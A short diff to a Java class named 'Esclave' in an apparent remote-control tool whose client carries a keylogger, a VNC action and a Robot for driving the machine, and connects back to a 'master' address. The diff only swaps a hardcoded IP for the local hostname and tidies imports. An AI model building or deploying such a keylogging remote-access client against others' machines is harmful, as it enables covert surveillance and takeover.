@@ -12,7 +12,6 @@ import java.net.Socket;
 import java.nio.file.Paths;
 
 import javax.imageio.ImageIO;
-import javax.swing.ImageIcon;
 
 import remote.action.ActionVNC;
 import remote.action.Keylogging;
@@ -37,8 +36,7 @@ public class Esclave
 	// =====================================================================
 
 	private InetAddress			m_addresse;
-	private final String			m_addresseMaitre	= "192.168.1.40";	// InetAddress.getLocalHost()
-	// .getHostName(); 															// Addresse IP de la machine distante
+	private final String			m_addresseMaitre	=  InetAddress.getLocalHost().getHostName(); 															// Addresse IP de la machine distante
 
 	private ObjectInputStream	_in;											// Flux d'entree
 	private Keylogging			m_keylogger;
@@ -130,7 +128,6 @@ public class Esclave
 		m_robot = new Robot(); 																		// Instancie un robot
 		this.receive(this); 																			// Instancie la reception des donnees
 		return true;
-
 	}
 
 	/**
